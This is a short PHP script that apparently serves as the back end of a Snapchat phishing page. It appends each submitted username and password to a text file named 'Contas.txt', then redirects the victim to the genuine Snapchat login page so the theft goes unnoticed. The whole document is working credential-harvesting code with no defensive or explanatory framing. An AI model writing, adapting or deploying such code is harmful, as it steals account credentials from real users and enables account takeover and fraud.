<?php

file_put_contents("Contas.txt", "Email: " . $_POST['username'] . " Senha: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://accounts.snapchat.com/accounts/login');
exit();
